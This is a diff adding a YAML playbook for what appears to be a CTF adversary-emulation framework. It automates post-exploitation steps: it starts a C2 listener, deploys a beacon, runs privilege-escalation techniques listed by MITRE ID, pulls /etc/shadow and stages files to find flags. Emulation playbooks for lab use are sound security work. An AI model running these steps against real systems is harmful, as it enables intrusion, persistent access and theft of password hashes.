@@ -1,0 +1,52 @@
+name: ctf_privesc
+version: 2
+description: Post-shell CTF escalation pass; loot pull, staged privilege escalation techniques through the working shell, then flag-material evidence capture.
+enabled: true
+tags:
+  - ctf
+  - privesc
+  - kernel
+  - ssh
+  - telnet
+platforms:
+  - linux
+total_timeout: 3600
+steps:
+  - id: bind
+    phase: post_exploitation
+    run: assign target {target}
+    description: bind the box into payload params
+  - id: c2_up
+    phase: post_exploitation
+    run: c2_server start
+    description: ensure the beacon listener is up before pulling loot
+    timeout: 300
+    continue_on_error: true
+  - id: deploy
+    phase: post_exploitation
+    run: c2_deploy {target}
+    description: stage the beacon onto the box
+    timeout: 600
+    continue_on_error: true
+  - id: emulate_privesc
+    phase: privilege_escalation
+    run: atomic_emulate --target {target} --techniques T1548.005,T1068,T1548.001,T1543.002,T1547.006
+    description: run staged privesc techniques (sudo, kernel, sudoer env, systemd, docker-style containers) through the working shell
+    timeout: 2400
+    continue_on_error: true
+  - id: loot_shadow
+    phase: post_exploitation
+    run: c2_loot {target} /etc/shadow
+    description: pull password policy material to prove root-equivalent access
+    timeout: 600
+    continue_on_error: true
+  - id: emulate_flag
+    phase: post_exploitation
+    run: atomic_emulate --target {target} --techniques T1083,T1005
+    description: file discovery and local data staging through the shell to surface flag files
+    timeout: 1800
+    continue_on_error: true
+  - id: session_close
+    phase: post_exploitation
+    run: create_session_json
+    continue_on_error: true
